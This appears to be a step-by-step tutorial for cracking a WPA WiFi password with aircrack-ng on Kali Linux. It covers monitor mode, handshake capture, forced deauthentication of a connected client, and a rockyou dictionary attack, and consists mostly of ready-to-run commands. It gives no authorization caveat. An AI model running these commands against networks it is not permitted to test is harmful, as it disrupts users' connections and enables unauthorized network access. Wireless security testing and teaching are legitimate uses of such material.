## aircrack-ng
Use `aircrack-ng` utility and Kali Linux to crack WiFi password

### Sepup wireless card
```bash
# check your wireless card symbol, typically wlan0 or wlan1
ifconfig
iwconfig

# this kills processes that may interfere with the adapter in monitor mode
airmon-ng check kill

ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up

# use iwconfig to check the mode of wlan0
```

#### Scan the network

```bash
# kill if needed
# airmon-ng check kill
airodump-ng wlan0

# Assume the WIFI signal you want to crack
# name: HackMePlease, channel: 6
# then change the channel of your wireless card to channel 6 as well
iwconfig wlan0 channel 6
```

#### Capture the traffic - Ignore the Handshake part in the screenshot

<div align=left><img src="../res/capture_of_handshake.jpg" width=95%></div>

**_STATION: the end devices that connected to this AP_**

We must have **at least one STATION** to do the attack

Here, the MAC of one of the stations is **8E:DB:E5:B5:2C:81**

```bash
# if <output_filename> is specified as capture
# then the desired result file is capture.cap
airodump-ng -c 6 --bssid <MAC_of_AP> -w <output_filename> wlan0
```

#### Send Deauth packets to one of the stations
<div align=left><img src="../res/send_deauth.jpg" width=95%></div>

```bash
# 10 times
aireplay-ng -0 10 -a <MAC_of_AP> -c 8E:DB:E5:B5:2C:81 wlan0
# or
# aireplay-ng --deauth 0 -a <MAC of AP> wlan0

       -a <bssid>
              Set Access Point MAC address.
       -c <dmac>
              Set destination MAC address.
```

#### Wait for the capture of handshake
<div align=left><img src="../res/capture_of_handshake.jpg" width=95%></div>

#### Wireshak to view the handshake
<div align=left><img src="../res/wireshark_of_handshake.jpg" width=95%></div>

#### Prepare for the wordlist
```bash
cd /usr/share/wordlists/
gunzip rockyou.txt.gz
```

#### Hack the password
<div align=left><img src="../res/password_of_handshake.jpg" width=95%></div>

```bash
aircrack-ng <Output_filename>.cap -w /usr/share/wordlists/rockyou.txt
```
